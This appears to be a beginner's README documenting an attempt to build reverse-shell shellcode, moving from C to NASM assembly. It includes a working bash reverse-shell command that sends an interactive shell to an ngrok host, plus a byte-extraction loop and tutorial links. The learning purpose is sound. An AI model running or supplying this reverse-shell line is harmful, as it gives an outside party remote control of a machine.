# shell-noob
I'm a shell noob, so nothing exciting here.

I'm also new to asm and C, but hey, I'm sure I've done tricker stuff before (famous last words).

## The command

```
/bin/bash -c "/bin/bash -i >& /dev/tcp/0.tcp.ngrok.io/12345 0>&1"
```

## Building

gcc ./shell-code.c -o ./bin/shellcode

## The runner

It seems that many shellcode tutorials use a common program template or husk to run the shellcode / bytearray.

I've included this in `templates/`.


## Findings

may not be possible to bind to /dev/tcp/x [1], as this is being done with some magic bash...

I might be able to fix this [3] by using execvp instead, just a wrapper for exec.

And it worked - reverse shell!

### Getting to assembly from C
Now I need to convert this to asm, so as per [2] I used `strace`;

```
strace -e execve ./bin/shellcode                      
execve("./bin/shellcode", ["./bin/shellcode"], [/* 120 vars */]) = 0
execve("/bin/bash", ["/bin/bash", "-c", "/bin/bash -i >& /dev/tcp/0.tcp.e"...], [/* 120 vars */]) = 0
/bin/bash: connect: Connection refused
/bin/bash: /dev/tcp/0.tcp.ngrok.io/12345: Connection refused
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=19295, si_uid=1000, si_status=1, si_utime=0, si_stime=0} ---
```
I can't see this working for me just yet...


Looking back at the original tutorial and code [4], I'm thinking I could do the same with my custom line, and just call execve.

Now I attempt to compile with the nasm utility;

```
nasm -felf32 -o ./bin/shell-code.o ./shell-code.asm
```
Unfortunately this didn't run, there must be errors...

I'm using zsh so the original example threw me out a little, I made a quick fix...
```
for i in $(objdump -d ./bin/shell-code.o -M intel |grep "^ " |cut -f2); do echo -n '\\x'$i; done; echo
```

Followed a SO, so going to try this... 
```
gcc -S input.c -o output.asm -masm=intel
```
Nope, did not work for me - [5] there are fundamental differences between NASM and TASM.





[1] https://stackoverflow.com/questions/44914538/execute-reverse-shell-using-execve
[2] http://www.arti-sec.com/article/create-shellcode-tcp-reverse-shell-slae
[3] https://stackoverflow.com/questions/14141007/c-executing-bash-commands-with-execvp
[4] https://gist.githubusercontent.com/Morgawr/9852347/raw/37fafdbfab6684d4fb374c826a2c1bc628cbe2b0/netcat-shellcode.asm
[5] https://stackoverflow.com/questions/8406188/does-gcc-really-know-how-to-output-nasm-assembly
## Resources

Some good resources for beginning this.

The original post that got me thinking;
https://morgawr.github.io/hacking/2014/03/29/shellcode-to-reverse-bind-with-netcat

### Introductions to shellcoding
http://hackerforhire.com.au/part-1-disassembling-and-understanding-shellcode/
https://en.wikipedia.org/wiki/Shellcode
http://www.enderunix.org/docs/en/sc-en.txt
http://www.vividmachines.com/shellcode/shellcode.html

### Dealing with bash -c
https://stackoverflow.com/questions/14141007/c-executing-bash-commands-with-execvp

### Reversing shellcode to assembly
https://xorl.wordpress.com/2009/01/04/from-shellcode-to-assembly/
https://zeltser.com/convert-shellcode-to-assembly/
https://haiderm.com/convert-hex-assembly-using-simple-python-script/

### Tools
https://github.com/reyammer/shellnoob

